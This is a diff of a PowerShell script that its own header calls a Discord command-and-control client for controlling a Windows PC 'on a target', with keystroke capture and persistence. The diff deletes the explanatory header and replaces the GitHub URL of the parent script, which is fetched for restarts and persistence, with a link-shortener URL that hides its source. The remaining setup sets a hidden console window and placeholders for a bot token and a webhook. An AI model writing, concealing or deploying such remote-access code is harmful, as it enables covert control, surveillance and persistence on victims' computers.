@@ -1,33 +1,3 @@
-<# ============================================= Beigeworm's Discord C2 Client ========================================================
-
-**SYNOPSIS**
-Using a Discord bot along with discords API and a webhook to Act as a Command and Control Platform.
-
-INFORMATION
-This script uses a discord bot along with discords API and a webhook to create a chat that can control a windows pc.
-Every 10 seconds it will check for a new message in chat and interpret it as a custom command / module in powershell.
-
-SETUP
-1. make a discord bot at https://discord.com/developers/applications/
-2. add the bot to your discord server (with intents enabled and messaging and file upload permissions)
-3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
-3. Change $dc below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
-4. Change $tk below with your bot token
-5. Change $ch below to the channel id of your webhook.
-
-USAGE
-1. Setup the script
-2. Run the script on a target.
-3. Check discord for 'waiting to connect..' message.
-4. Enter the computername to authenticate the session.
-5. Enter commands to interact with the target.
-
-EXTRA
-You can add custom scripting / commands - Type 'YOUR CUSTOM POWERSHELL COMMAND' in chat
-Control all waiting sessions simultaneously with 'control-all' to mass authenticate sessions.
-Killswitch - Type 'kill' in chat to stop 'KeyCapture' or other commands listed in 'extrainfo'..
-#>
-
 # =============================================================================== SETUP VARIABLES ===================================================================================
 
 # CHANGE below and add your details (only if not defined in a stageer)
@@ -35,7 +5,7 @@ $hookurl = "$dc" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r
 $token = "$tk" # make sure your bot is in the same server as the webhook
 $chan = "$ch" # make sure the bot AND webhook can access this channel
 
-$parent = "https://raw.githubusercontent.com/pickle493/Flipper-Zero/main/PoshCord-C2.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://is.gd/hXJGXw" # parent script URL (for restarts and persistance)
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 
 # =============================================================== SCRIPT SETUP =========================================================================
